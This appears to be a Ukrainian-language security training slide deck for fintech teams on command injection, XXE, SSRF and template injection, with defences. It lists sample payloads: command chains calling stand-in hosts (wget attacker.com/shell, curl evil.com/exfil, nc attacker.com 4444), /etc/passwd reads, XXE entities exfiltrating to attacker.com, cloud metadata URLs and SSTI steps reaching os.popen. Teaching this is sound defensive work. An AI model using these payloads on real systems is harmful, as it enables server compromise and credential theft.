Впровадження команд (Command Injection)

Виконання команд ОС через додаток

📄 PDF-генератор: wkhtmltopdf з user input → ; cat /etc/passwd
📊 Звіти: генерація виписок, конвертація файлів, обробка документів
🏦 FinTech: всюди, де сервер викликає CLI з даними клієнта

Захист: НІКОЛИ shell execution з даними користувача. Використовуйте бібліотечні API. Якщо неминуче — строгий білий список (whitelist).

Зовнішні сутності XML (XXE)

Вразливість XML-парсерів

📄 Читання файлів (File Read): зовнішня сутність читає /etc/passwd або конфігурації
🌐 SSRF: через DTD — запити до внутрішніх сервісів
💥 «Мільярд сміхів» (Billion Laughs): DoS через рекурсивне розгортання сутностей
🏦 FinTech: SWIFT XML, ISO 20022, SOAP API, банківські звіти

Захист: вимкнути DTD processing та external entities. Використовувати JSON замість XML де можливо.

Комплексний захист

🚫
Без shell-команд
Ніколи виконання через оболонку з даними користувача. Бібліотечні API замість CLI
🌐
Захист від SSRF
Блокування приватних IP, білий список доменів, IMDSv2
📄
Запобігання XXE
Вимкнути DTD та external entities у всіх XML-парсерах
📝
Безпека шаблонів
Ізольоване середовище (Sandbox) шаблонізатора, заборона виконання коду

SSRF: сценарії атак

Хмарні та внутрішні вектори

☁️
Хмарні метадані (Cloud Metadata)
AWS: 169.254.169.254/latest/meta-data/iam/
GCP: metadata.google.internal
Azure: 169.254.169.254/metadata
🗄️
Внутрішні сервіси
Redis: dict://localhost:6379
Elasticsearch: http://localhost:9200
Consul/etcd: конфігурації та секрети
🔧
Адмін-панелі
Kubernetes Dashboard
Jenkins: http://internal:8080
Grafana, phpMyAdmin без auth
📂
Файлові протоколи
file:///etc/passwd
gopher:// для складних запитів
ftp:// для внутрішніх файлів

SSRF у фінтех: доступ до внутрішнього API платежів → ініціювання переказів без автентифікації.

XXE: приклади payload

Типові атаки через XML-парсер

📄 Читання файлів (File Read): <!ENTITY xxe SYSTEM "file:///etc/passwd"> → читання системних файлів
🌐 SSRF через XXE: <!ENTITY xxe SYSTEM "http://169.254.169.254/..."> → cloud metadata
💥 «Мільярд сміхів» (Billion Laughs): рекурсивне розгортання сутностей → DoS, пам'ять сервера вичерпується
📤 Сліпа XXE (Blind XXE): дані через OOB — <!ENTITY % xxe SYSTEM "http://attacker.com/?d=...">

FinTech контекст: SWIFT MT/MX повідомлення, ISO 20022, SOAP-інтеграції — всі використовують XML і вразливі до XXE.

Впровадження команд: патерни

Як зловмисники впроваджують команди ОС

⛓️
Ланцюжок команд
; cat /etc/passwd
&& wget attacker.com/shell
|| curl evil.com/exfil
🔄
Підстановка
$(whoami)

📝
Pipe та redirect
| nc attacker.com 4444
> /var/www/shell.php
>> /etc/crontab
🛡️
Захист
Бібліотечні API (не CLI)
Білий список аргументів
Ізольоване середовище / контейнери

Генерація PDF-виписок, конвертація документів, обробка зображень — типові точки входу впровадження команд (Command Injection) у фінтех.

SSTI: атаки на шаблонізатори

Від ін'єкції в шаблон до RCE

1
Виявлення
Введення {{7*7}} → якщо відповідь 49, шаблонізатор вразливий
2
Ідентифікація
{{7*'7'}} → Jinja2: 7777777, Twig: 49 — визначаємо движок
3
Ескалація
Доступ до внутрішніх об'єктів: __class__, __globals__, __builtins__
4
RCE
os.popen('cat /etc/passwd').read() — повне виконання команд

Фінтех: email "Шановний {{user.name}}" → якщо user.name = {{payload}}, сервер виконає довільний код.

Command Injection vs SQL-ін'єкція

Порівняння масштабу загрози

🗄️
SQL-ін'єкція
Обмежена межами СУБД
Читання / зміна / видалення записів
Не виходить за рамки бази даних
💻
Command Injection
Доступ до всієї ОС
Файлова система, мережа, процеси
Повна компрометація сервера

Одна вразливість Command Injection у PDF-генераторі = точка входу для компрометації всієї банківської інфраструктури.

SSRF у хмарних архітектурах

Різний масштаб загрози залежно від середовища

🏢
On-premise
Внутрішні сервіси мають автентифікацію, додаткові бар'єри після проникнення
☁️
Cloud (AWS/Azure/GCP)
Metadata services без автентифікації, credentials за HTTP-запитом
🐳
Kubernetes / Service Mesh
Внутрішній DNS, service discovery, доступ до мікросервісів за іменами
⚠️
Наслідки
SSRF = еквівалент мережевого зламу, доступ до інфраструктурних облікових записів

У хмарній архітектурі SSRF надає доступ не лише до даних, а й до інфраструктурних credentials.

XXE у банківських конвеєрах

Чому фінансовий сектор особливо вразливий

📨 SWIFT-повідомлення — мільйони XML-документів щоденно
📋 Регуляторні звіти — НБУ, ISO 20022
⚙️ Застарілі парсери — DTD увімкнено за замовчуванням
⚠️ Дилема безпеки — вимкнення DTD може порушити легітимну функціональність

Міграція на безпечні конфігурації у фінансових системах потребує поетапного впровадження та ретельного тестування.

Спільний принцип: порушення довіри

Усі серверні ін'єкції мають одну першопричину

💻
Command Injection
Довіра до даних у командній оболонці
🌐
SSRF
Довіра до URL-адрес для HTTP-запитів
📄
XXE
Довіра до структури XML-документа
📝
SSTI
Довіра до вмісту шаблону

Єдиний принцип: сервер НЕ повинен довіряти даним користувача у жодному контексті виконання.

🛡️

Ключові висновки

1️⃣ Впровадження команд (Command Injection) — будь-який CLI з user input = RCE
2️⃣ Підробка серверних запитів (SSRF) — доступ до хмарних метаданих = повна компрометація (Capital One)
3️⃣ Зовнішні сутності XML (XXE) — критичний для фінтех через SWIFT XML, ISO 20022
4️⃣ Серверна ін'єкція в шаблони (SSTI) — email та PDF шаблони з клієнтськими даними = вектор атаки
